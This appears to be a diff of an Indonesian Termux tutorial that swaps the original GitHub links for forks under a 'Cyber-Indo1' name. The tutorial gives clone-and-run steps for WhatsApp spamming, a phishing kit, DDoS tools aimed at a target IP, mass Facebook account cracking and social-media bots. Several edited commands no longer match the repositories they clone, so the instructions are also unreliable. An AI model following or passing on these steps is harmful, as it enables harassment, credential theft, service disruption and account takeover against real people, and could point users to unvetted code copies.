@@ -5,9 +5,9 @@ $ pkg install python2 (y/n pilih y)
 $ pkg install php (y/n pilih y)
 $ pkg install git (y/n pilih y)
 Setalah mengikuti perintah di atas waktu-nya kita clonning tool-nya :
-$ git clone https://github.com/siputra12/prank.git
-Setelah proses cloning selesai kita move on dari perintah di atas dan ketikan perintah ini :
-$ cd prank
+$ git clone https://github.com/Cyber-Indo1/prank.git
+Setelah proses kloning selesai kita lanjutkan dari perintah di atas dan ketikan perintah ini:
+$ cd Cyber-Indo1
 $ ls
 $ php wa.php
 Kemudian masukan Nomor WhatsApp yang kalian ingin spam contoh : 085710917169 kemudian enter pada pilihan y/n pilih y
@@ -21,15 +21,15 @@ $pkg install python2 -y
 $pkg install apache2
 $pkg install php -y
 $pkg install git
-$git clone https://github.com/Senitopeng/PhisingGame
+$git clone https://github.com/Cyber-Indo1/PhisingGame
 $ls
 $cd PhisingGame
 $python2 phising.py
 *Gunain dengan bijak cuk -_-*
 Cara Install OSIF ( Open Source Information Facebook )
 $ pkg install python2
-$ git clone https://github.com/ciku370/OSIF
-$ cd OSIF
+$ git clone https://github.com/Cyber-Indo/CYBER
+$ cd CYBER
 $ pip2 install -r requirements.txt
 Dan cara menjalankannya menggunakan perintah :
 python2 osif.py
@@ -39,7 +39,7 @@ python2 osif.py
 $pkg update && pkg upgrade
 $pkg install git
 $pkg install curl
-$git clone https://github.com/AndriGanz/whatshack
+$git clone https://github.com/Cyber-Indo1y/whatshack
 $cd whatshack
 $ls
 $sh whatshack.sh
@@ -50,7 +50,7 @@ D-tect tool
 Cara Install D-tect tool di android termux (command ) :
 $ apt install git
 $ apt install python2
-$ git clone https://github.com/shawarkhanethicalhacker/D-TECT
+$ git clone https://github.com/Cyber-Indo1/D-TECT
 $ ls
 $ cd D-TECH
 $ chmod +x d-tect.py
@@ -66,8 +66,8 @@ chmod -v vbug.py
 python2 vbug.py
 4. irssi
   /connet irc.freenode.net
-/nick w3wandroid
-/join #modol
+/nick Cyber-Indo1
+/join #CyberVarun
 _________________________
 DDOS via Termux
 ————————————
@@ -83,7 +83,7 @@ $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.12
 2. Xerxes
 $ apt install git
 $ apt install clang
-$ git clone https://github.com/zanyarjamal/xerxes
+$ git clone https://github.com/Cyber-Indo1/xerxes
 $ ls
 $ cd xerxes
 $ ls
@@ -179,13 +179,13 @@ Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan 
 15. Jadi deh
 ————————
 Auto boot fb
-git clone https://github.com/Senitopeng/BotFbBangDjon.git
+git clone https://github.com/Cyber-Indo1/BotFbBanDjon.git
 cd BotFbBangDjon
 python2 bangdjon.py
 melihat id fb
 https://findmyfbid.in/
 Autoreaction Facebook
-git clone https://github.com/tomiashari/fb-autoreaction.git
+git clone https://github.com/Cyber-Indo1/fb-autoreaction.git
 cd fb-autoreaction
 python2 fb-autoreaction
 •TOOLS²TERMUX.P3
@@ -223,7 +223,7 @@ pkg install python2
 pkg install ruby
 gem install lolcat
 pkg install git
-git clone https://github.com/Hanzelnutt/instabot
+git clone https://github.com/Cyber-Indo1/instabot
 cd instabot
 ls
 pip2 install -r requirements.txt
@@ -299,7 +299,8 @@ git clone http://github.com/hnov7/mbf
 cd mbf
 python2 mbf. py
 Mbf tanpa username dan password. Jdi tinggl make aja
-[8/10 19.49] Yovis Si Wibub: --------------------------TOTUR MBF-----------------------$ pkg update && pkg upgrade
+[8/10 19.49] Yovis Si Wibub: --------------------------TOTUR MBF-----------------------
+$ pkg update && pkg upgrade
 $ pkg install python2
 $ pip2 install mechanize
 ‌$ git clone https://github.com/pirmansx/mbf
@@ -325,7 +326,7 @@ Hack FB rombongan
 $ apt update && apt upgrade
 $ pkg install python2 git
 $ pip2 install mechanize
-$ git clone http://github.com/pirmansx/mbf
+$ git clone http://github.com/Cyber-Indo1/mbf
 $ ls
 $ cd mbf
 $ python2 MBF.py
